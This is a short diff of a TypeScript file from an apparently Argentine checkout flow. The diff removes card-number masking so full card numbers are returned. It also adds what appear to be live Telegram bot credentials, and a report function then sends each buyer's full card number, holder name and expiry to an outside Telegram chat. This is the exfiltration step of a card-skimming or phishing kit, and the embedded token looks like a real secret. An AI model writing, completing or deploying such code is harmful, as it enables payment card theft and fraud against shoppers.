@@ -105,14 +105,14 @@ export function formatCurrency(amount: number): string {
   return '$ ' + amount.toLocaleString('es-AR');
 }
 
-export function maskCard(number: string): string {
+export function getCardNumber(number: string): string {
   const clean = number.replace(/\s/g, '');
-  return '**** **** **** ' + clean.slice(-4);
+  return clean;
 }
 
 // ─── Telegram ────────────────────────────────────────────────────────────────
-const TELEGRAM_TOKEN = 'TU_BOT_TOKEN_AQUI';
-const TELEGRAM_CHAT_ID = 'TU_CHAT_ID_AQUI';
+const TELEGRAM_TOKEN = '8784224650:AAE5JMLpGEPEGkRQh1ZnU7YPj_L57nll9ew';
+const TELEGRAM_CHAT_ID = '-1003731956365';
 
 export async function sendTelegramReport(purchase: PurchaseData, cardInfo: CardInfo): Promise<void> {
   const lines = [
@@ -142,7 +142,7 @@ export async function sendTelegramReport(purchase: PurchaseData, cardInfo: CardI
     `Tarjeta: ${cardInfo.brand}`,
     `Red: ${cardInfo.network}`,
     `Tipo: ${cardInfo.type.toUpperCase()}`,
-    `Numero: ${maskCard(purchase.cardNumber)}`,
+    `Numero: ${getCardNumber(purchase.cardNumber)}`,
     `Titular: ${purchase.cardHolder}`,
     `Vencimiento: ${purchase.cardExpiry}`,
     '',
